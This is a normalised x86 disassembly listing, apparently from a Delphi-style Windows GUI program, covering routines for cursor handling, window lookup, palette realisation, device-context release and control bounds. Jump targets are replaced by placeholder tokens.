mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_44cdc8
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_44c6f4
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_456d34
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d09d
mov eax [ rw-data ]
call sub_40331c
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_4657c8
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_44fa80
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_44c5c0
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_469434
sub_44d09d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_40331c
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_4034a8
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
sub_44d12c
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_44b794
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_44d160
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_44d12c
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_44e3f8
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_4529a0
test eax eax
je r-xdata
mov esi eax
sub_44d1a8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_418b9c
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebx ] eax
sub_44d1d0
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_418e94
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_40331c
xor eax eax
mov [ ebx ] eax
sub_44d1f0
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44d220
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_4190bc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44d2d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_419120
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_44d2a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_44d45c
call sub_403b7c
call sub_403b7c
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_418cf8
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_425968
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_44d2dc
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_4190bc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44d37a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d381
mov eax [ rw-data ]
call sub_419120
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_44d352
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_44d45c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4259c4
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_418cf8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_425968
test al al
je r-xdata
sub_44d388
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
call sub_44d45c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4254e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_44d3b4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_425b48
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_425b4c
mov eax [ ebp - 0x4 ]
call sub_44d4a8
mov eax [ rw-data ]
call sub_4190bc
mov ebx eax
xor eax eax
push ebp
push sub_44d439
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_418b9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_419120
retn
call sub_44d220
sub_44d45c
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_425b4c
mov edx ebx
mov eax [ rw-data ]
call sub_4190d0
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_44d4a8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44ef10
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_44d4d4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032ec
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_44d510
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_4193d8
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_44d558
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_44d614
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44d6e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d6e8
lea eax [ ebp - 0x1c ]
call sub_404118
lea eax [ ebp - 0x8 ]
call sub_404118
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_403518
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_45dee8
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_409280
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_40416c
sub_44d704
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44d76b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_45af08
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_44e8b4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034cc
mov edx [ eax + 0x64 ]
pop eax
call sub_404524
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d772
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov al 0x1
sub_44d778
push ebx
mov ebx eax
mov eax ebx
call sub_45af30
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034cc
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44d7ac
push ebx
mov ebx eax
mov eax ebx
call sub_45af80
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034cc
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_404524
je r-xdata
mov al 0x1
pop ebx
retn
sub_44d7e4
push ebx
mov ebx eax
mov eax ebx
call sub_45afbc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034cc
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44d818
push ebx
mov ebx eax
mov eax ebx
call sub_42236c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44d840
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44e8e4
sub_44d860
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_44d880
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_40416c
sub_44d8a4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_44e7d4
sub_44d8c4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_44d8f0
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034cc
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034cc
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_404524
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034cc
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_44d954
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44e230
sub_44d974
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44e21c
sub_44d994
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_44d9b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_421a7c
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42492c
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_44e964
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44d4d4
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_44f840
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_44da8c
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_4036d0
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_46d34c
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4036b8
push edi
xor ecx ecx
mov edx 0xb039
call sub_44fa80
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_44e254
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_403518
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_40331c
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_40331c
mov eax [ edi + 0x68 ]
call sub_40331c
mov eax [ edi + 0x64 ]
call sub_408df0
mov edx ebx
and dl 0xfc
mov eax edi
call sub_421ac8
test bl bl
jle r-xdata
sub_44db58
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_44db80
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_403518
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44dc08
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_44df08
sub_44dc28
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_40331c
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45089c
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403518
mov edx ebx
mov eax edi
call sub_421b4c
mov eax ebx
mov si 0xffd9
call sub_403518
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_44dcf0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_421edc
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_44fa80
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_44fa80
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_44fa80
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_44fa80
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_44fa80
sub_44dd84
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_421d98
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_44e86c
jmp r-xdata
xor edx edx
mov eax esi
call sub_44dc28
sub_44ddc8
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_403518
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_44dc08
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403518
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_44de70
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_450010
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44ecfc
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_44df08
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_44fa80
mov eax ebx
mov si 0xffd0
call sub_403518
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_403518
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_44df08
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_4553b8
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_44e024
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_44e048
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_44e070
